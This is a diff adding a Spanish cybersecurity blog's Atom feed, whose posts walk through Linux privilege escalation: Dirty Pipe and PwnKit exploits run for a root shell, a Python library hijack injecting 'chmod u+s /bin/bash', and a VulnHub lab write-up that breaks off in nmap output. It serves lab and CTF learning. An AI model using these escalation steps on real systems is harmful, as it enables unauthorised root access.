@@ -1,0 +1,696 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-28T02:16:58-03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Not Lucken | Ciberseguridad</title><subtitle>Artículos sobre ciberseguridad, CTFs e investigaciones</subtitle><author><name>notlucken</name></author><entry><title type="html">Dirty Pipe - CVE-2022-0847</title><link href="http://localhost:4000/Dirty-Pipe/" rel="alternate" type="text/html" title="Dirty Pipe - CVE-2022-0847" /><published>2022-10-28T00:00:00-03:00</published><updated>2022-10-28T00:00:00-03:00</updated><id>http://localhost:4000/Dirty-Pipe</id><content type="html" xml:base="http://localhost:4000/Dirty-Pipe/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/dirtyP/logo.png&quot; width=&quot;400&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&quot;dirty-pipe-vulnerability&quot;&gt;Dirty Pipe Vulnerability&lt;/h1&gt;
+&lt;p&gt;Dirty Pipe &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847&quot;&gt;(CVE-2022-0847)&lt;/a&gt; es una vulnerabilidad en el Kernel de  Linux que permite a los usuarios no privilegiados modificar archivos de solo lectura y obtener una shell con privilegios.&lt;/p&gt;
+
+&lt;h2 id=&quot;versiones-afectadas&quot;&gt;Versiones afectadas&lt;/h2&gt;
+&lt;p&gt;Las versiones de Kernel de Linux que son afectadas son las siguentes:&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;5.8 -&amp;gt; 5.16.10 
+5.15.24 
+5.10.101&lt;/em&gt;&lt;/p&gt;
+
+&lt;h2 id=&quot;links&quot;&gt;Links:&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;1: &lt;a href=&quot;https://dirtypipe.cm4all.com/&quot;&gt;https://dirtypipe.cm4all.com/&lt;/a&gt;&lt;/li&gt;
+  &lt;li&gt;2: &lt;a href=&quot;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-084&quot;&gt;https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;como-explotar-un-dirty-pipe&quot;&gt;Como explotar un Dirty Pipe&lt;/h2&gt;
+&lt;p&gt;Una vez ganamos acceso al sistema, y sin saber la contraseña, si ponemos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;uname -a&lt;/code&gt; vemos que el Kernel es de version &lt;em&gt;&amp;gt;=5.16.9&lt;/em&gt; -&amp;gt; version vulnerable.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos listar el &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, pero no podemos modificarlo.
+Para esto sirve el exploit, modificar archivos siendo usuarios sin privilegios.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;El exploit que esta en https://dirtypipe.cm4all.com/ podemos ponerlo en un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit.c&lt;/code&gt; y compilarlo, para luego introducir lo que queremos hacer con el archivo a modificar.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Que hicimos aqui: 
+Modificamos el usuario &lt;em&gt;daemon&lt;/em&gt;, y lo hicimos root&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Ahora, hay que obtener una shell como Root.&lt;/p&gt;
+
+&lt;h3 id=&quot;obtener-una-shell-como-root-despues-de-usar-dirty-pipe&quot;&gt;Obtener una Shell como root despues de usar Dirty Pipe&lt;/h3&gt;
+
+&lt;p&gt;Primero, hay que ver si hay algun SUID vulnerable para hacer escalada de privilegios.
+Usamos el famoso comando: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Vemos que &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/bin/sudo&lt;/code&gt;  es un binario SUID con permisos de ejecucion.&lt;/p&gt;
+
+&lt;p&gt;Para poder explotarlo, hay que usar otro binario llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dirtypipez.c&lt;/code&gt;&lt;/p&gt;
+
+&lt;h3 id=&quot;3-explotacion-final&quot;&gt;3: Explotacion final:&lt;/h3&gt;
+&lt;p&gt;&lt;em&gt;https://raw.githubusercontent.com/febinrev/dirtypipez-exploit/main/dirtypipez.c&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Luego de compilarlo, hay que correrlo como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;./exploit2 /usr/bin/sudo&lt;/code&gt; para ganar acceso a una Shell como root.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/dirtyP/8.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>notlucken</name></author><category term="Escalada de Privilegios" /><category term="Kernel" /><summary type="html">Como escalar privilegios con la vulnerabilidad de Kernel Dirty Pipe.</summary></entry><entry><title type="html">PwnKit - Privilege Escalation</title><link href="http://localhost:4000/pwnKit-privilege-escalation/" rel="alternate" type="text/html" title="PwnKit - Privilege Escalation" /><published>2022-10-28T00:00:00-03:00</published><updated>2022-10-28T00:00:00-03:00</updated><id>http://localhost:4000/pwnKit-privilege-escalation</id><content type="html" xml:base="http://localhost:4000/pwnKit-privilege-escalation/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/pwnKit/logo.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&quot;pwnkit-vulnerability&quot;&gt;PwnKit Vulnerability&lt;/h1&gt;
+&lt;p&gt;PwnKit es una vulnerabilidad de correcion de memoria en pkexec de Polkit, que le permite a algun usuario sin privilegios convertirse en Root..
+Polkit es el software que se encarga de controlar los privilegios de sistema en sistemas basados en Unix. Es un programa SUID instalado en todas las distribuiciones de Linux.&lt;/p&gt;
+
+&lt;h3 id=&quot;reconocimiento-de-un-pwnkit&quot;&gt;Reconocimiento de un PwnKit&lt;/h3&gt;
+
+&lt;p&gt;Las versiones de pkexec vulnerables a un PwnKit son todas desde &lt;em&gt;Mayo de 2009 -&amp;gt; Hasta el presente.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;La version de Kernel que tenemos ahora es &lt;em&gt;5.4.0-199-generic&lt;/em&gt; y la distribucion es &lt;em&gt;Ubuntu 20.04 LTS.&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnKit/pwn2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Si hacemos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;find / -perm -4000 2&amp;gt;/dev/null&lt;/code&gt; sale que pkexec es un binario SUID.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnKit/pwn3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Y la version del &lt;em&gt;pkexec&lt;/em&gt; es la &lt;em&gt;0.105&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnKit/pwn4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;En mi GitHub dejo los exploits que hay que utilizar.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://github.com/notlucken/linux-privilege-escalation/tree/main/PwnKit&quot;&gt;pwnKit Exploit&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Esta &lt;em&gt;MakeFile&lt;/em&gt;, el &lt;em&gt;evil-so.c&lt;/em&gt; y &lt;em&gt;exploit.c&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnKit/pwn6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hacemos un  ./MakeFile y nos dara algunos errores, pero no pasa nada.&lt;/p&gt;
+
+&lt;p&gt;y luego un &lt;strong&gt;./exploit&lt;/strong&gt; y listo!&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/pwnKit/pwn7.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;</content><author><name>notlucken</name></author><category term="pkexec" /><category term="SUID" /><summary type="html">Explicacion de que es el PwnKit y como explotarlo.</summary></entry><entry><title type="html">Python Library Privilege Escalation</title><link href="http://localhost:4000/python-library-privilege-escalation/" rel="alternate" type="text/html" title="Python Library Privilege Escalation" /><published>2022-10-28T00:00:00-03:00</published><updated>2022-10-28T00:00:00-03:00</updated><id>http://localhost:4000/python-library-privilege-escalation</id><content type="html" xml:base="http://localhost:4000/python-library-privilege-escalation/">&lt;p&gt;Primero hay que localizar un Script que el dueño sea root:
+![[Pasted image 20221025202417.png]]
+Luego al entrar a ese script, veremos que se utiliza alguna librería, y deberemos buscarla en /usr/lib/python… 
+![[Pasted image 20221025202505.png]]&lt;/p&gt;
+
+&lt;p&gt;Entonces, ahora en la librería lo que tenemos que poner es lo siguiente:
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;import os
+&lt;/code&gt;os.system(“chmod u+s /bin/bash”)&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;
+![[Pasted image 20221025202557.png]]
+Esto lo que hará es que le dará a la bash permisos de superusuario.
+ahora solamente deberemos insertar &lt;/code&gt;bash -p` y listo.
+![[Pasted image 20221025202727.png]]&lt;/p&gt;</content><author><name>notlucken</name></author><summary type="html">Primero hay que localizar un Script que el dueño sea root: ![[Pasted image 20221025202417.png]] Luego al entrar a ese script, veremos que se utiliza alguna librería, y deberemos buscarla en /usr/lib/python… ![[Pasted image 20221025202505.png]]</summary></entry><entry><title type="html">Tratamiento de la TTY</title><link href="http://localhost:4000/Tratamiento-de-la-TTY/" rel="alternate" type="text/html" title="Tratamiento de la TTY" /><published>2022-10-27T00:00:00-03:00</published><updated>2022-10-27T00:00:00-03:00</updated><id>http://localhost:4000/Tratamiento-de-la-TTY</id><content type="html" xml:base="http://localhost:4000/Tratamiento-de-la-TTY/"></content><author><name>notlucken</name></author><category term="tty" /><category term="Bash" /><category term="Trabajo" /><summary type="html">Aqui veremos como hacerle un tratamiento a la TTY para poder mejorar y agilizar nuestro trabajo.</summary></entry><entry><title type="html">ICA 1 - VulnHub Writeup</title><link href="http://localhost:4000/ICA1-Writeup/" rel="alternate" type="text/html" title="ICA 1 - VulnHub Writeup" /><published>2022-10-27T00:00:00-03:00</published><updated>2022-10-27T00:00:00-03:00</updated><id>http://localhost:4000/ICA1-Writeup</id><content type="html" xml:base="http://localhost:4000/ICA1-Writeup/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/ICA/logo.png&quot; width=&quot;400&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h1 id=&quot;ica-1-writeup-by-notlucken&quot;&gt;ICA: 1 Writeup by notlucken&lt;/h1&gt;
+
+&lt;h2 id=&quot;reconocimiento-de-servicios-expuestos&quot;&gt;Reconocimiento de Servicios expuestos&lt;/h2&gt;
+
+&lt;p&gt;Primero como siempre, tiro de nmap, con los argumentos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -p- --open -sS --min-rate 5000 -Pn -n 192.168.100.116&lt;/code&gt; y luego a los puertos abiertos les aplico un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap -p22,80,3306,33060 -sCV 192.168.100.116&lt;/code&gt;. Este es el resultado del segundo escaneo:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 8.4p1 Debian 5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| ssh-hostkey: 
+|   3072 0e:77:d9:cb:f8:05:41:b9:e4:45:71:c1:01:ac:da:93 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;RSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|   256 40:51:93:4b:f8:37:85:fd:a5:f4:d7:27:41:6c:a0:a5 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ECDSA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_  256 09:85:60:c5:35:c1:4d:83:76:93:fb:c7:f0:cd:7b:8e &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ED25519&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+80/tcp    open  http    Apache httpd 2.4.48 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-title: qdPM | Login
+|_http-server-header: Apache/2.4.48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+3306/tcp  open  mysql   MySQL 8.0.26
+| mysql-info: 
+|   Protocol: 10
+|   Version: 8.0.26
+|   Thread ID: 43
+|   Capabilities flags: 65535
+|   Some Capabilities: Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Support41Auth, FoundRows, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ConnectWithDatabase, LongColumnFlag, SwitchToSSLAfterHandshake, ODBCClient, LongPassword, InteractiveClient, SupportsCompression, DontAllowDatabaseTableColumn, Speaks41ProtocolNew, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
+|   Status: Autocommit
+|   Salt: C-1&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;037x&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0C&amp;amp;f&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;7FBS6&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;nz&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1B6&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0D,
+|_  Auth Plugin Name: caching_sha2_password
+| ssl-cert: Subject: &lt;span class=&quot;nv&quot;&gt;commonName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;MySQL_Server_8.0.26_Auto_Generated_Server_Certificate
+| Not valid before: 2021-09-25T10:47:29
+|_Not valid after:  2031-09-23T10:47:29
+|_ssl-date: TLS randomness does not represent &lt;span class=&quot;nb&quot;&gt;time
+&lt;/span&gt;33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+  31   │ |     Invalid message&lt;span class=&quot;s2&quot;&gt;&quot;
+  32   │ |     HY000
+  33   │ |   LDAPBindReq: 
+  34   │ |     *Parse error unserializing protobuf message&quot;&lt;/span&gt;
+  35   │ |     HY000
+  36   │ |   oracle-tns: 
+  37   │ |     Invalid message-frame.&lt;span class=&quot;s2&quot;&gt;&quot;
+  38   │ |_    HY000
+  39   │ 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+  40   │ SF-Port33060-TCP:V=7.92%I=7%D=10/27%Time=635B068E%P=x86_64-pc-linux-gnu%r(
+  41   │ SF:NULL,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(GenericLines,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b
+  42   │ SF:&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(GetRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(HTTPO
+  43   │ SF:ptions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RTSPRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0
+  44   │ SF:b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(RPCCheck,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(DNSVer
+  45   │ SF:sionBindReqTCP,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(DNSStatusRequestTCP,
+  46   │ SF:2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;'\x1a\x0f
+  47   │ SF:Invalid\x20message\&quot;\x05HY000&quot;)%r(Help,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;
+  48   │ SF:)%r(SSLSessionReq,2B,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0\x1e\0\0\0\x01\x08\x0
+  49   │ SF:1\x10\x88'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServerCooki
+  50   │ SF:e,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TLSSessionReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\&lt;/span&gt;
+  51   │ SF:x08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;'\x1a\x0fInvalid\x20message\
+  52   │ SF:&quot;\x05HY000&quot;)%r(Kerberos,9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(SMBProgNeg,
+  53   │ SF:9,&quot;\x05\0\0\0\x0b\x08\x05\x1a\0&quot;)%r(X11Probe,2B,&quot;\x05\0\0\0\x0b\x08\x05
+  54   │ SF:\x1a\0\x1e\0\0\0\x01\x08\x01\x10\x88'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;0fInvalid&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20message&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY
+  55   │ SF:000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(FourOhFourRequest,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LPDString
+  56   │ SF:,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LDAPSearchReq,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;
+  57   │ SF:08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;'\x1a\x0fInvalid\x20message\&quot;
+  58   │ SF:\x05HY000&quot;)%r(LDAPBindReq,46,&quot;\x05\0\0\0\x0b\x08\x05\x1a\x009\0\0\0\x01
+  59   │ SF:\x08\x01\x10\x88'&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\*&lt;/span&gt;Parse&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20error&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20unserializing&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20protobuf&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;20m
+  60   │ SF:essage&lt;span class=&quot;se&quot;&gt;\&quot;\x&lt;/span&gt;05HY000&lt;span class=&quot;s2&quot;&gt;&quot;)%r(SIPOptions,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(LA
+  61   │ SF:NDesk-RC,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(TerminalServer,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0&lt;/span&gt;
+  62   │ SF:&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(NCP,9,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;)%r(NotesR
+  63   │ SF:PC,2B,&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;0b&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;05&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;1a&lt;span class=&quot;se&quot;&gt;\0\x&lt;/span&gt;1e&lt;span class=&quot;se&quot;&gt;\0\0\0\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;08&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;01&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;10&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;88&lt;span class=&quot;s1&quot;&gt;'\x1a\
